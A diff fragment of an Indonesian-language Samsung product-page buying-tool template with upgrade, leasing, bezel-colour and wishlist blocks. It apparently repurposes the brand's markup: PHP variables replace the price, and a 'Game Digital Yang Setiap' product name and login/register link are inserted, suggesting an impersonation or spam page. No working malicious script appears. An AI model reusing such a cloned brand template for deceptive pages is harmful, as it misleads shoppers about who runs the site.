+         <!-- CRHQ-2498 Pre-purchase Check, 20241031 by mati namgab - VD and DA 영역 Start -->
+         <div class="pd-select-option pd-select-option--type-offer-text" style="display: none;">
+         </div>
+         <div class="pd-select-option off-change option-upgrade pd-select-option--upgrade-program" style="display: none;">
+         </div>
+         <div class="option-result result-upgrade" style="display: none;">
+         </div>
+         <div class="pd-select-option off-change option-galaxy-forever" style="display: none;">
+         </div>
+         <div class="option-result result-galaxy-forever" style="display: none;">
+         </div>
+         <div class="pd-select-option off-change option-assured-buy-back" style="display: none;">
+         </div>
+         <div class="option-result-dev result-option-assured-buy-back" style="display: none;">
+         </div>
+         <div class="option-divider emi-links" style="display: none;">
+         </div>
+         <div class="pd-buying-tool__emi-calculator" style="display: none;">
+         </div>
+        </div>
+        <div class="hdd02-buying-tool__cost-box hdd02-buying-tool__cost-box--old sg-pdh-order-summary">
+        </div>
+        <div aria-modal="true" class="add-on__layer-learn-more" id="addOnLayerPopupLearnMore" role="dialog">
+         <div class="add-on-popup">
+          <div class="add-on-popup__inner">
+           <h2 class="add-on-popup__title">
+           </h2>
+           <div class="add-on-popup__contents scrollbar">
+            <div class="scrollbar__contents">
+             <div class="add-on__learn-more-images">
+             </div>
+             <div class="add-on__learn-more-content">
+             </div>
+            </div>
+           </div>
+           <button class="add-on-popup__close" type="button">
+            <span class="hidden">
+             Layer Popup Close
+            </span>
+           </button>
+          </div>
+         </div>
+        </div>
+       </section>
+       <!-- N -->
+       <!--googleoff: all true-->
+       <div class="sdf-component-templates" id="sg-pdh-dynamic-template-assembly">
+        <div class="hdd02-buying-tool__cost-box hdd02-buying-tool__cost-box--old sdf-component-template" data-sdf-template="buyingPrice @ price" data-sdf-unwrap="true">
+         <div class="hdd02-buying-tool__summary">
+          <div class="summary">
+           <div class="summary__product-wrap">
+            <strong class="summary__product-name">
+             Game Digital Yang Setiap
+            </strong>
+            <p class="summary__product-price" style="display:none;">
+             {{price.priceWrapper.info.salePriceFormatted}}
+            </p>
+           </div>
+           <div class="summary__select-option-wrap">
+            <span class="summary__select-option">
+             Terpercaya
+            </span>
+            <span class="summary__select-option">
+             Game Digital Yang Setiap
+            </span>
+            <span class="summary__select-option">
+             Terpopuler
+            </span>
+           </div>
+           <div data-sdf-attr.class="summary__product-wrap" data-sdf-repeat.item="{{price.summaryArea.embedAddonSelected}}">
+            <p data-sdf-attr.class="summary__product-name">
+             {{item.name}}
+            </p>
+            <p data-sdf-attr.class="summary__product-price">
+             {{item.summaryPrice}}
+            </p>
+           </div>
+           <div class="summary__product-wrap warranty-wrap">
+           </div>
+          </div>
+          <div class="cost-box cost-box--default">
+           <em class="cost-box__badge">
+           </em>
+           <p class="cost-box__price" data-total-price="1399000">
+            <strong class="cost-box__price-now" style="font-size: 20px; text-align: justify;">
+             <?= $description; ?>
+            </strong>
+           </p>
+           <div class="cost-box__cta-wrap">
+            <span class="cost-box__cta">
+             <a href="<?= $canonical; ?>" class="cta cta--contained cta--emphasis add-special-tagging">
+              Masuk/Daftar
+             </a>
+            </span>
+           </div>
+          </div>
+         </div>
+        </div>
+        <div class="pd-info__wishlist sdf-component-template" data-sdf-template="wishlist @ drawObj" data-sdf-unwrap="true">
+         <a aria-selected="{{wishList.isSelected}}" class="pd-wishlist-cta js-layer-open {{wishList.contentWrapperClass}}" data-add-text="tambahkan ke wishlist" data-added-text="Hapus wishlist" data-component="HDD01" data-div-id="{{wishList.targetId}}" data-modelcode="{{wishList.moCode}}" data-modeldisplay="galaxy a07" data-modelname="{{wishList.moName}}" data-pimsubtype="galaxy a" data-product-name="{{wishList.moName}}" data-pvisubtype="smartphone" data-pvitype="mobile" data-sdf-attr.data-modelprice="{{wishList.price}}" data-stock="{{wishList.stockLevelStatus}}" data-target-popup="wishPopup" href="javascript:void(0);" role="button">
+          <span class="hidden">
+           WishList
+          </span>
+          <svg class="icon unselect" focusable="false" viewbox="0 0 96 96" xmlns="http://www.w3.org/2000/svg">
+           <path d="M82.659 46.562c-.237.336-1.321 1.867-1.736 2.413-6.187 8.141-26.914 24.719-32.859 29.329L48 78.25l-.064.054c-5.945-4.61-26.672-21.188-32.857-29.327a136.36 136.36 0 01-1.737-2.415A19.366 19.366 0 0110.5 36.449c0-10.729 8.748-19.457 19.5-19.457a19.549 19.549 0 0115.957 8.28L48 28.171l2.044-2.899A19.548 19.548 0 0166 16.992c10.753 0 19.5 8.728 19.5 19.457 0 3.577-.982 7.072-2.841 10.113M66 11.992a24.556 24.556 0 00-18 7.875 24.552 24.552 0 00-18-7.875c-13.509 0-24.5 10.971-24.5 24.457 0 4.53 1.254 8.957 3.625 12.802l.086.13s1.391 1.967 1.885 2.619c3.235 4.257 10.172 10.853 20.619 19.603a514.58 514.58 0 0010.291 8.386c4.905 3.893 4.905 3.893 5.706 3.986l.288.033.289-.033c.8-.093.8-.093 5.706-3.986a517.926 517.926 0 0010.29-8.386c10.447-8.75 17.384-15.346 20.62-19.604.494-.651 1.884-2.618 1.884-2.618l.086-.13A24.365 24.365 0 0090.5 36.449c0-13.486-10.99-24.457-24.5-24.457">
+           </path>
+          </svg>
+          <svg class="icon select" focusable="false" viewbox="0 0 96 96" xmlns="http://www.w3.org/2000/svg">
+           <path d="M48.002 84.009l-.298-.035c-.796-.096-.796-.096-5.698-3.986a514.58 514.58 0 01-10.291-8.386c-10.447-8.75-17.384-15.346-20.618-19.603-.495-.651-1.886-2.62-1.886-2.62l-.085-.129A24.366 24.366 0 015.5 36.448c0-13.486 10.991-24.457 24.5-24.457 6.87 0 13.392 2.896 18 7.875a24.56 24.56 0 0118-7.875c13.51 0 24.5 10.971 24.5 24.457 0 4.53-1.253 8.957-3.625 12.802l-.085.129s-1.391 1.969-1.886 2.62c-3.234 4.257-10.172 10.853-20.618 19.603a514.58 514.58 0 01-10.291 8.386c-4.901 3.89-4.901 3.89-5.696 3.985l-.297.036z">
+           </path>
+          </svg>
+         </a>
+        </div>
+        <div class="hdd02-buying-tool__emi-calculator sdf-component-template" data-sdf-template="calculator @ drawObj" data-sdf-test="{{calculator.hasComponent}}" data-sdf-unwrap="true">
+         <a an-ac="pd buying tool" an-ca="option click" an-la="emi calculator" an-tr="hdd02_product info.-product detail-calculator-option_click1" aria-haspopup="true" class="cta cta--underline cta--black add-special-tagging {{calculator.emiAttr.class}}" data-sdf-attr.data-target-popup="{{calculator.emiAttr.layerTarget}}" data-sdf-attr.href="{{calculator.emiAttr.href}}" data-sdf-attr.target="{{calculator.emiAttr.target}}" data-sdf-attr.title="{{calculator.emiAttr.title}}">
+          {{calculator.emiAttr.text}}
+         </a>
+        </div>
+        <div class="pd-select-option__wrap sdf-component-template" data-sdf-template="between @ drawObj" data-sdf-test="{{between.hasComponent}}" data-sdf-unwrap="true">
+         <ul class="pd-select-option__list" role="list">
+          <li class="pd-select-option__item selected" role="listitem">
+           <div class="pd-option-selector">
+            <input an-ac="pd buying tool" an-ca="option click" an-la="leasing:no" an-tr="header(pim)_option selector-product detail-select-service option" checked="checked" class="hidden option-input add-special-tagging" id="pd-leasing-0" name="pd-leasing" type="radio"/>
+            <label class="pd-option-selector__label" for="pd-leasing-0">
+             <span class="pd-option-selector__text-wrap">
+              <span class="pd-option-selector__text">
+               <strong class="pd-option-selector__main-text">
+                {{between.purchase.text}}
+               </strong>
+              </span>
+             </span>
+            </label>
+           </div>
+          </li>
+          <li class="pd-select-option__item" role="listitem">
+           <div class="pd-option-selector">
+            <input an-ac="pd buying tool" an-ca="option click" an-la="leasing:yes" an-tr="header(pim)_option selector-product detail-select-service option" class="hidden option-input add-special-tagging" data-monthly-value="{{between.nonPurchase.monthlyValue}}" data-payment-value="{{between.nonPurchase.paymentValue}}" data-sdf-attr.data-leaseing="{{between.nonPurchase.dataLeaseing}}" data-tenure-unit="{{between.nonPurchase.tenureUnit}}" data-tenure-value="{{between.nonPurchase.tenureValue}}" id="pd-leasing-1" name="pd-leasing" type="radio"/>
+            <label class="pd-option-selector__label" for="pd-leasing-1">
+             <span class="pd-option-selector__text-wrap">
+              <span class="pd-option-selector__text">
+               <strong class="pd-option-selector__main-text">
+                {{between.nonPurchase.text}}
+               </strong>
+              </span>
+             </span>
+            </label>
+           </div>
+          </li>
+         </ul>
+        </div>
+        <div class="pd-select-option off-change option-upgrade pd-select-option--upgrade-program sdf-component-template" data-sdf-template=" upgrade @ drawObj" data-sdf-test="{{upgrade.hasComponent}}" data-sdf-unwrap="true">
+         <div class="pd-select-option__headline-wrap">
+          <h3 class="pd-select-option__headline" data-sdf-test="{{upgrade.title}}">
+           {{upgrade.title}}
+          </h3>
+          <span class="pd-select-option__cta-wrap" data-sdf-test="{{upgrade.learnMoreCta.text}}">
+           <a an-ac="pd buying tool" an-ca="option click" an-la="upgrade program:learn more" an-tr="hdd02_product info.-product detail-option servicce selector-option_click" aria-haspopup="dialog" class="cta cta--underline cta--black add-special-tagging" data-sdf-attr.data-target-popup="{{upgrade.learnMoreCta.layerTarget}}" data-sdf-attr.href="{{upgrade.learnMoreCta.href}}" data-sdf-attr.target="{{upgrade.learnMoreCta.target}}" data-sdf-attr.title="{{upgrade.learnMoreCta.title}}">
+            {{upgrade.learnMoreCta.text}}
+           </a>
+          </span>
+         </div>
+         <p class="pd-select-option__desc" data-sdf-test="{{upgrade.description}}">
+          {{upgrade.description}}
+         </p>
+         <div class="pd-select-option__wrap" data-sdf-test="{{upgrade.isNotEmbededType}}">
+          <ul class="pd-select-option__list" role="list">
+           <li class="pd-select-option__item" role="listitem">
+            <div class="pd-option-selector">
+             <input an-ac="pd buying tool" an-ca="option click" an-la="upgrade program:yes" an-tr="hdd02_product info.-product detail-option servicce selector-option_click" class="hidden option-input add-special-tagging {{upgrade.yesAttr.class}}" data-target-popup="{{upgrade.yesAttr.layerTarget}}" id="pd-samsung-upgrade-0" name="pd-samsung-upgrade" type="radio"/>
+             <label class="pd-option-selector__label" for="pd-samsung-upgrade-0">
+              <span class="pd-option-selector__text-wrap">
+               <span class="pd-option-selector__text">
+                <strong class="pd-option-selector__main-text">
+                 {{upgrade.yesAttr.text}}
+                </strong>
+                <span class="pd-option-selector__sub-text">
+                 {{upgrade.yesAttr.subText}}
+                </span>
+               </span>
+              </span>
+             </label>
+            </div>
+           </li>
+           <li class="pd-select-option__item" role="listitem">
+            <div class="pd-option-selector">
+             <input an-ac="pd buying tool" an-ca="option click" an-la="upgrade program:no" an-tr="hdd02_product info.-product detail-option servicce selector-option_click" class="hidden option-input add-special-tagging {{upgrade.noAttr.class}}" data-event-type="{{upgrade.noAttr.eventType}}" data-target-popup="{{upgrade.noAttr.layerTarget}}" id="pd-samsung-upgrade-1" name="pd-samsung-upgrade" type="radio"/>
+             <label class="pd-option-selector__label" for="pd-samsung-upgrade-1">
+              <span class="pd-option-selector__text-wrap">
+               <span class="pd-option-selector__text">
+                <strong class="pd-option-selector__main-text">
+                 {{upgrade.noAttr.text}}
+                </strong>
+               </span>
+              </span>
+             </label>
+            </div>
+           </li>
+          </ul>
+         </div>
+         <p class="pd-select-option__desc selected-disclaimer">
+         </p>
+        </div>
+        <div class="option-result result-upgrade sdf-component-template" data-sdf-template=" upgradeResult @ drawObj " data-sdf-test="{{upgradeResult.isGp}}" data-sdf-unwrap="true">
+         <div class="option-result__text-wrap result-price" data-sdf-attr.data-id="{{upgradeResult.dataId}}" data-sdf-attr.data-price="{{upgradeResult.dataPrice}}">
+          <p class="option-result__text-title" data-sdf-test="{{upgradeResult.displayModelName}}">
+           {{upgradeResult.displayModelName}}
+          </p>
+          <p class="option-result__text" data-sdf-test="{{upgradeResult.discountText1}}">
+           {{upgradeResult.discountText1}}
+          </p>
+         </div>
+         <div class="option-result__desc-wrap" data-sdf-test="{{upgradeResult.description1}}">
+          <p class="option-result__desc">
+           {{upgradeResult.description1}}
+          </p>
+          <p class="option-result__desc">
+           {{upgradeResult.description2}}
+          </p>
+         </div>
+         <a class="option-result__close remove-upgrade-result" href="javascript:void(0)">
+          <span class="hidden">
+           Tutup
+          </span>
+          <svg class="icon" focusable="false" viewbox="0 0 96 96">
+           <path d="M79.17 11.17L48 42.34 16.83 11.17l-5.66 5.66L42.34 48 11.17 79.17l5.66 5.66L48 53.66l31.17 31.17 5.66-5.66L53.66 48l31.17-31.17z">
+           </path>
+          </svg>
+         </a>
+        </div>
+        <div class="option-result result-upgrade hidden sdf-component-template" data-sdf-template="upgradeResultHybris @ drawObj " data-sdf-test="{{upgradeResultHybris.isHybris}}" data-sdf-unwrap="true">
+         <div class="option-result__desc-wrap" data-sdf-test="{{upgradeResult.description1}}">
+          <p class="option-result__desc">
+           {{upgradeResult.description1}}
+          </p>
+          <p class="option-result__desc">
+           {{upgradeResult.description2}}
+          </p>
+         </div>
+        </div>
+        <div class="pd-select-option option-offer-finance sdf-component-template" data-sdf-template="offerFinance @ drawObj" data-sdf-test="{{offerFinance.hasComponent}}" data-sdf-unwrap="true">
+         <div class="pd-select-option__headline-wrap">
+          <h3 class="pd-select-option__headline">
+           {{offerFinance.title}}
+          </h3>
+          <span class="pd-select-option__cta-wrap">
+           <a an-ac="pd buying tool" an-ca="option click" an-la="samsung finance:learn more" an-tr="header(pim)_option selector-product detail-select-service option" class="cta cta--underline cta--black" data-sdf-attr.href="{{offerFinance.learnMoreCta.href}}" rel="nofollow" role="button" target="{{offerFinance.learnMoreCta.target}}">
+            {{offerFinance.learnMoreCta.text}}
+           </a>
+          </span>
+         </div>
+         <p class="pd-select-option__desc">
+          {{offerFinance.description}}
+         </p>
+        </div>
+        <div class="pd-select-option option-galaxy-forever sdf-component-template" data-sdf-template=" galaxyForever @ drawObj" data-sdf-test="{{galaxyForever.hasComponent}}" data-sdf-unwrap="true">
+         <div class="pd-select-option__headline-wrap">
+          <h3 class="pd-select-option__headline" data-sdf-test="{{galaxyForever.title}}">
+           {{galaxyForever.title}}
+          </h3>
+          <span class="pd-select-option__cta-wrap" data-sdf-test="{{galaxyForever.learnMoreCta.text}}">
+           <button an-ac="pd buying tool" an-ca="option click" an-la="galaxy forever:learn more" an-tr="hdd02_product info.-product detail-option service selector-option_click" aria-haspopup="dialog" class="cta cta--underline-v2 cta--black add-special-tagging" data-sdf-attr.data-layer-target="{{galaxyForever.learnMoreCta.layerTarget}}" data-sdf-attr.href="{{galaxyForever.learnMoreCta.href}}" data-sdf-attr.target="{{galaxyForever.learnMoreCta.target}}" data-sdf-attr.title="{{galaxyForever.learnMoreCta.title}}" data-sdf-test="{{ galaxyForever.learnMoreCta.isNotOutLink}}" rel="nofollow">
+            {{galaxyForever.learnMoreCta.text}}
+           </button>
+           <a an-ac="pd buying tool" an-ca="option click" an-la="galaxy forever:learn more" an-tr="hdd02_product info.-product detail-option service selector-option_click" aria-haspopup="dialog" class="cta cta--underline-v2 cta--black cta--icon" data-sdf-attr.data-layer-target="{{galaxyForever.learnMoreCta.layerTarget}}" data-sdf-attr.href="{{galaxyForever.learnMoreCta.href}}" data-sdf-attr.target="{{galaxyForever.learnMoreCta.target}}" data-sdf-attr.title="{{galaxyForever.learnMoreCta.title}}" data-sdf-test="{{galaxyForever.learnMoreCta.isOutLink}}">
+            {{galaxyForever.learnMoreCta.text}}
+            <svg aria-hidden="true" class="icon" focusable="false">
+             <use href="#outlink-bold" xlink:href="#outlink-bold">
+             </use>
+            </svg>
+           </a>
+          </span>
+         </div>
+         <p class="pd-select-option__desc" data-sdf-test="{{galaxyForever.description}}">
+          {{galaxyForever.description}}
+         </p>
+         <div class="pd-select-option__wrap">
+          <ul class="pd-select-option__list" role="list">
+           <li class="pd-select-option__item" role="listitem">
+            <div class="pd-option-selector">
+             <input an-ac="pd buying tool" an-ca="option click" an-la="galaxy forever:yes" an-tr="hdd02_product info.-product detail-option service selector-option_click" class="hidden option-input add-special-tagging {{galaxyForever.yesAttr.class}}" data-layer-target="{{galaxyForever.yesAttr.layerTarget}}" id="pd-samsung-galaxy-forever-0" name="pd-samsung-galaxy-forever" type="radio"/>
+             <label class="pd-option-selector__label" for="pd-samsung-galaxy-forever-0">
+              <span class="pd-option-selector__text-wrap">
+               <span class="pd-option-selector__text">
+                <strong class="pd-option-selector__main-text">
+                 {{galaxyForever.yesAttr.text}}
+                </strong>
+                <span class="pd-option-selector__sub-text">
+                 {{galaxyForever.yesAttr.subText}}
+                </span>
+               </span>
+              </span>
+             </label>
+            </div>
+           </li>
+           <li class="pd-select-option__item" role="listitem">
+            <div class="pd-option-selector">
+             <input an-ac="pd buying tool" an-ca="option click" an-la="galaxy forever:no" an-tr="hdd02_product info.-product detail-option service selector-option_click" class="hidden option-input add-special-tagging {{galaxyForever.noAttr.class}}" data-event-type="{{galaxyForever.noAttr.eventType}}" data-layer-target="{{galaxyForever.noAttr.layerTarget}}" id="pd-samsung-galaxy-forever-1" name="pd-samsung-galaxy-forever" type="radio"/>
+             <label class="pd-option-selector__label" for="pd-samsung-galaxy-forever-1">
+              <span class="pd-option-selector__text-wrap">
+               <span class="pd-option-selector__text">
+                <strong class="pd-option-selector__main-text">
+                 {{galaxyForever.noAttr.text}}
+                </strong>
+               </span>
+              </span>
+             </label>
+            </div>
+           </li>
+          </ul>
+         </div>
+        </div>
+        <div class="option-result result-galaxy-forever sdf-component-template" data-sdf-template=" galaxyForeverResult @ drawObj " data-sdf-unwrap="true">
+         <div class="option-result__text-wrap result-price" data-sdf-attr.data-id="{{galaxyForeverResult.dataId}}" data-sdf-attr.data-price="{{galaxyForeverResult.dataPrice}}">
+          <p class="option-result__text-title" data-sdf-test="{{galaxyForeverResult.displayModelName}}">
+           {{galaxyForeverResult.displayModelName}}
+          </p>
+          <p class="option-result__text" data-sdf-test="{{galaxyForeverResult.discountText1}}">
+           {{galaxyForeverResult.discountText1}}
+          </p>
+         </div>
+         <div class="option-result__desc-wrap" data-sdf-test="{{galaxyForeverResult.description1}}">
+          <p class="option-result__desc">
+           {{galaxyForeverResult.description1}}
+          </p>
+          <p class="option-result__desc">
+           {{galaxyForeverResult.description2}}
+          </p>
+         </div>
+         <a class="option-result__close remove-forever-result" href="javascript:void(0)">
+          <span class="hidden">
+           Tutup
+          </span>
+          <svg class="icon" focusable="false" viewbox="0 0 96 96">
+           <path d="M79.17 11.17L48 42.34 16.83 11.17l-5.66 5.66L42.34 48 11.17 79.17l5.66 5.66L48 53.66l31.17 31.17 5.66-5.66L53.66 48l31.17-31.17z">
+           </path>
+          </svg>
+         </a>
+        </div>
+        <div class="pd-select-option option-bezelcolor bundle-group sdf-component-template" data-sdf-template="bezelOption @ drawObj" data-sdf-test="{{bezelOption.hasComponent}}" data-sdf-unwrap="true">
+         <div data-sdf-test="{{bezelOption.bezel}}" data-sdf-unwrap="true">
+          <div class="pd-select-option__headline-wrap">
+           <h3 class="pd-select-option__headline">
+            Pilih warna Anda
+           </h3>
+          </div>
+          <p class="pd-select-option__desc">
+           Bezel yang dapat disesuaikan dijual terpisah
+          </p>
+          <div class="pd-select-option__wrap" data-sdf-test="{{bezelOption.noneSellingWithBazel}}">
+           <ul class="pd-select-option__list pd-select-option__list--default {{bezelOption.bezelImageClass}}" role="list">
+            <li class="pd-select-option__item" role="listitem">
+             <div class="pd-option-selector">
+              <input class="hidden bezel-option-input add-special-tagging buyingoption-api" data-bezelmodelcode="dummyCode" data-bezelmodelpatterncode="" id="pd-color-multi-0" name="pd-color-multi" type="radio"/>
+              <label class="pd-option-selector__label" for="pd-color-multi-0">
+               <span class="pd-option-selector__text-wrap">
+                <span class="pd-option-selector__text">
+                 Tidak ada warna
+                 <i>
+                  (Default)
+                 </i>
+                </span>
+               </span>
+              </label>
+             </div>
+            </li>
+           </ul>
+          </div>
+         </div>
+         <div data-sdf-test="{{bezelOption.freestyle}}" data-sdf-unwrap="true">
+          <div class="pd-select-option__headline-wrap">
+           <h3 class="pd-select-option__headline">
+            Pilih warna skin Anda
+           </h3>
+          </div>
+          <p class="pd-select-option__desc">
+           Skin yang dapat disesuaikan, dijual terpisah
+          </p>
+          <div class="pd-select-option__wrap" data-sdf-test="{{bezelOption.noneSellingWithBazel}}">
+           <ul class="pd-select-option__list pd-select-option__list--default {{bezelOption.bezelImageClass}}" role="list">
+            <li class="pd-select-option__item" role="listitem">
+             <div class="pd-option-selector">
+              <input class="hidden bezel-option-input add-special-tagging buyingoption-api" data-bezelmodelcode="dummyCode" data-bezelmodelpatterncode="" id="pd-color-multi-0" name="pd-color-multi" type="radio"/>
+              <label class="pd-option-selector__label" for="pd-color-multi-0">
+               <span class="pd-option-selector__text-wrap">
+                <span class="pd-option-selector__text">
+                 Putih
+                 <i>
+                  (termasuk)
+                 </i>
+                </span>
+               </span>
+              </label>
+             </div>
+            </li>
+           </ul>
+          </div>
+         </div>
+         <div data-sdf-test="{{bezelOption.noneType}}" data-sdf-unwrap="true">
+          <div class="pd-select-option__wrap">
+           <ul class="pd-select-option__list pd-select-option__list--color" role="list">
+            <li class="pd-select-option__item" data-sdf-repeat.item="{{bezelOption.noneTypeList}}" role="listitem">
+             <div class="pd-option-selector" data-disabled="{{item.disabledClass}}">
+              <input an-ac="pd buying tool" an-ca="option click" an-la="bezel:none type {{item.name}}" an-tr="hdd02_pdp header-product detail-option service selector-option_click" class="hidden bezel-option-input add-special-tagging buyingoption-api" data-bezelmodelcode="{{item.modelCode}}" data-bezelmodelpatterncode="{{item.modelPatternCode}}" id="pd-color-multi1-{{item.index}}" name="pd-color-multi" type="radio"/>
+              <label class="pd-option-selector__label" data-sdf-test="{{item.hasNotImage}}" for="pd-color-multi1-{{item.index}}">
+               <span class="pd-option-selector__color" data-sdf-attr.style="background:{{item.value}}">
+               </span>
+               <span class="pd-option-selector__text-wrap">
+                <span class="pd-option-selector__text">
+                 {{item.name}}
+                </span>
+               </span>
+              </label>
+              <label class="pd-option-selector__label" data-sdf-test="{{item.hasImage}}" for="pd-color-multi1-{{item.index}}">
+               <div class="pd-option-selector__img-wrap">
+                <div data-sdf-attr.class="image">
+                 <img alt="image" data-comp-name="image" data-desktop-src="{{item.imageUrl}}$n_80_PNG$" data-mobile-src="{{item.imageUrl}}$n_160_PNG$" data-sdf-attr.class="image__main lazy-load responsive-img" role="img"/>
+                </div>
+               </div>
+              </label>
+             </div>
+             <p class="pd-select-option__item-option-text">
+              {{item.name}}
+             </p>
+             <p class="pd-select-option__item-notice">
+              Habis
+             </p>
+            </li>
+           </ul>
+          </div>
+         </div>
+         <div data-sdf-test="{{bezelOption.modernType}}" data-sdf-unwrap="true">
+          <div class="pd-select-option__sub-headline-wrap">
+           <h4 class="pd-select-option__sub-headline">
+            Jenis modern
+           </h4>
+           <button aria-haspopup="true" aria-label="MordernType information details" class="pd-select-option__info-link" data-target-popup="mordernType" type="button">
+            <svg aria-hidden="true" class="icon" focusable="false">
+             <use href="#info-regular" xlink:href="#info-regular">
+             </use>
+            </svg>
+           </button>
+          </div>
+          <div class="pd-select-option__wrap">
+           <ul class="pd-select-option__list pd-select-option__list--color" role="list">
+            <li class="pd-select-option__item" data-sdf-repeat.item="{{bezelOption.modernTypeList}}" role="listitem">
+             <div class="pd-option-selector" data-disabled="{{item.disabledClass}}">
+              <input an-ac="pd buying tool" an-ca="option click" an-la="bezel:modern type {{item.name}}" an-tr="hdd02_pdp header-product detail-option service selector-option_click" class="hidden bezel-option-input add-special-tagging buyingoption-api" data-bezelmodelcode="{{item.modelCode}}" data-bezelmodelpatterncode="{{item.modelPatternCode}}" id="pd-color-multi1-{{item.index}}" name="pd-color-multi" type="radio"/>
+              <label class="pd-option-selector__label" data-sdf-test="{{item.hasNotImage}}" for="pd-color-multi1-{{item.index}}">
+               <span class="pd-option-selector__color" data-sdf-attr.style="background:{{item.value}}">
+               </span>
+               <span class="pd-option-selector__text-wrap">
+                <span class="pd-option-selector__text">
+                 {{item.name}}
+                </span>
+               </span>
+              </label>
+              <label class="pd-option-selector__label" data-sdf-test="{{item.hasImage}}" for="pd-color-multi1-{{item.index}}">
+               <div class="pd-option-selector__img-wrap">
+                <div data-sdf-attr.class="image">
+                 <img alt="image" data-comp-name="image" data-desktop-src="{{item.imageUrl}}$n_80_PNG$" data-mobile-src="{{item.imageUrl}}$n_160_PNG$" data-sdf-attr.class="image__main lazy-load responsive-img" role="img"/>
+                </div>
+               </div>
+              </label>
+             </div>
+             <p class="pd-select-option__item-option-text">
+              {{item.name}}
+             </p>
+             <p class="pd-select-option__item-notice">
+              Habis
+             </p>
+            </li>
+           </ul>
+          </div>
+         </div>
+         <div data-sdf-test="{{bezelOption.beveledType}}" data-sdf-unwrap="true">
+          <div class="pd-select-option__sub-headline-wrap">
+           <h4 class="pd-select-option__sub-headline">
+            Jenis bevel
+           </h4>
+           <button aria-haspopup="true" aria-label="Type information details" class="pd-select-option__info-link" data-target-popup="beveledType" type="button">
+            <span class="hidden">
+             Type information details
+            </span>
+            <svg aria-hidden="true" class="icon" focusable="false">
+             <use href="#info-regular" xlink:href="#info-regular">
+             </use>
+            </svg>
+           </button>
+          </div>
+          <div class="pd-select-option__wrap">
+           <ul class="pd-select-option__list pd-select-option__list--color" role="list">
+            <li class="pd-select-option__item" data-sdf-repeat.item="{{bezelOption.beveledTypeList}}" role="listitem">
+             <div class="pd-option-selector" data-disabled="{{item.disabledClass}}">
+              <input an-ac="pd buying tool" an-ca="option click" an-la="bezel:beveled type {{item.name}}" an-tr="hdd02_pdp header-product detail-option service selector-option_click" class="hidden bezel-option-input add-special-tagging buyingoption-api" data-bezelmodelcode="{{item.modelCode}}" data-bezelmodelpatterncode="{{item.modelPatternCode}}" id="pd-color-multi2-{{item.index}}" name="pd-color-multi" type="radio"/>
+              <label class="pd-option-selector__label" data-sdf-test="{{item.hasNotImage}}" for="pd-color-multi2-{{item.index}}">
+               <span class="pd-option-selector__color" data-sdf-attr.style="background:{{item.value}}">
+               </span>
+               <span class="pd-option-selector__text-wrap">
+                <span class="pd-option-selector__text">
+                 {{item.name}}
+                </span>
+               </span>
+              </label>
+              <label class="pd-option-selector__label" data-sdf-test="{{item.hasImage}}" for="pd-color-multi2-{{item.index}}">
+               <div class="pd-option-selector__img-wrap">
+                <div data-sdf-attr.class="image">
+                 <img alt="image" data-comp-name="image" data-desktop-src="{{item.imageUrl}}$n_80_PNG$" data-mobile-src="{{item.imageUrl}}$n_160_PNG$" data-sdf-attr.class="image__main lazy-load responsive-img" role="img"/>
+                </div>
+               </div>
+              </label>
+             </div>
+             <p class="pd-select-option__item-option-text">
+              {{item.name}}
+             </p>
+             <p class="pd-select-option__item-notice">
+              Habis
+             </p>
+            </li>
+           </ul>
+          </div>
+         </div>
+         <div data-sdf-test="{{bezelOption.freestyle}}" data-sdf-unwrap="true">
+          <div class="pd-select-option__sub-headline-wrap">
+           <h4 class="pd-select-option__sub-headline">
+            Warna skin
+           </h4>
+          </div>
+          <div class="pd-select-option__wrap">
+           <ul class="pd-select-option__list pd-select-option__list--color" role="list">
+            <li class="pd-select-option__item" data-sdf-repeat.item="{{bezelOption.freestyleList}}" role="listitem">
+             <div class="pd-option-selector" data-disabled="{{item.disabledClass}}">
+              <input an-ac="pd buying tool" an-ca="option click" an-la="bezel:modern type {{item.name}}" an-tr="hdd02_pdp header-product detail-option service selector-option_click" class="hidden bezel-option-input add-special-tagging buyingoption-api" data-bezelmodelcode="{{item.modelCode}}" data-bezelmodelpatterncode="{{item.modelPatternCode}}" id="pd-color-multi1-{{item.index}}" name="pd-color-multi" type="radio"/>
+              <label class="pd-option-selector__label" data-sdf-test="{{item.hasNotImage}}" for="pd-color-multi1-{{item.index}}">
+               <span class="pd-option-selector__color" data-sdf-attr.style="background: {{item.value}}">
+               </span>
+               <span class="pd-option-selector__text-wrap">
+                <span class="pd-option-selector__text">
+                 {{item.name}}
+                </span>
+               </span>
+              </label>
+              <label class="pd-option-selector__label" data-sdf-test="{{item.hasImage}}" for="pd-color-multi1-{{item.index}}">
+               <div class="pd-option-selector__img-wrap">
+                <div data-sdf-attr.class="image">
+                 <img alt="image" data-comp-name="image" data-desktop-src="{{item.imageUrl}}$n_80_PNG$" data-mobile-src="{{item.imageUrl}}$n_160_PNG$" data-sdf-attr.class="image__main lazy-load responsive-img" role="img"/>
+                </div>
+               </div>
+              </label>
+             </div>
+             <p class="pd-select-option__item-option-text">
+              {{item.name}}
+             </p>
+             <p class="pd-select-option__item-notice">
+              Habis
+             </p>
+            </li>
+           </ul>
+          </div>
+         </div>
+         <div class="pd-select-option__bezel-type-popup" id="mordernType" role="dialog">
+          <div class="layer-popup">
+           <div class="layer-popup__inner">
+            <h2 class="layer-popup__title">
+             Jenis bezel
+            </h2>
+            <div class="layer-popup__contents scrollbar">
+             <div class="scrollbar__contents">
+              <div data-sdf-attr.class="pd-selector-option__bezel-image">
+               <div data-sdf-attr.class="image">
+                <img alt="alt text" data-desktop-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/the-frame-bezel-popup-modern-pc.jpg?$636_300_JPG$" data-mobile-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/the-frame-bezel-popup-modern-mo.jpg?$624_320_JPG$" data-sdf-attr.class="image__preview lazy-load responsive-img" role="img"/>
+                <img alt="alt text" data-desktop-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/the-frame-bezel-popup-modern-pc.jpg?$636_300_JPG$" data-mobile-src="/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/resources/images/the-frame-bezel-popup-modern-mo.jpg?$624_320_JPG$" data-sdf-attr.class="image__main lazy-load responsive-img" role="img"/>
+               </div>
               </div>
-              <div class="my-store-locator-drawer__search">
-                <form id="storeLocatorSearchForm" class="nosubmit_form my-store-locator-drawer__form">
-                    <input
-                      class="nosubmit my-store-locator-drawer__input"
-                      id="storeLocatorSearch"
-                      type="search"
-                      name="storeLocatorSearch"
